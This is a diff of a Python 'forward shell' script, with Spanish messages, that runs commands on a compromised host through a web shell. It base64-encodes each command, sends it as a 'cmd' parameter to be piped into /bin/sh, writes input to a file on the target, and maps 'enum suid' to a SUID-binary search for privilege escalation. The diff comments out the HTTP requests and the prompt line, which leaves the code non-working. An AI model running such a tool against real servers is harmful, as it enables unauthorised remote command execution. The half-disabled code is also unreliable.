@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 
-import requests
+#import requests
 import time
 
-from termcolor import colored
+#from termcolor import colored
 from base64 import b64encode
 from random import randrange
 
@@ -24,11 +24,11 @@ class ForwardShell:
             'cmd': 'echo "%s" | base64 -d | /bin/sh' % command
         }
 
-        try:
-            r = requests.get(self.main_url, params=data, timeout=5)
-            return r.text
-        except:
-            pass
+ #       try:
+#            r = requests.get(self.main_url, params=data, timeout=5)
+#            return r.text
+ #       except:
+  #          pass
 
         return None
 
@@ -39,7 +39,7 @@ class ForwardShell:
             'cmd': 'echo "%s" | base64 -d > %s' % (command, self.stdin)
         }
 
-        r = requests.get(self.main_url, params=data)
+#        r = requests.get(self.main_url, params=data)
 
     def read_stdout(self):
         for _ in range(5):
@@ -65,17 +65,17 @@ class ForwardShell:
         self.setup_shell()
 
         while True:
-            command = input(colored("> ", 'yellow'))
+#            command = input(colored("> ", 'yellow'))
 
             if "script /dev/null -c bash" in command:
-                print(colored(f"\n[+] Se ha iniciado una pseudo-terminal\n", 'blue'))
+#                print(colored(f"\n[+] Se ha iniciado una pseudo-terminal\n", 'blue'))
                 self.is_pseudo_terminal = True
 
             if command.strip() == "enum suid":
                 command = "find / -perm -4000 2>/dev/null | xargs ls -l"
 
             if command.strip() == "help":
-                print(colored(f"\n[+] Listando panel de ayuda:\n", 'blue'))
+#                print(colored(f"\n[+] Listando panel de ayuda:\n", 'blue'))
                 for key, value in self.help_options.items():
                     print(f"\n\t{key} - {value}\n")
                 continue
@@ -85,7 +85,7 @@ class ForwardShell:
 
             if command.strip() == "exit":
                 self.is_pseudo_terminal = False
-                print(colored(f"\n[!] Se ha salido de la pseudo-terminal\n", 'red'))
+#                print(colored(f"\n[!] Se ha salido de la pseudo-terminal\n", 'red'))
                 self.clear_stdout()
                 continue
 
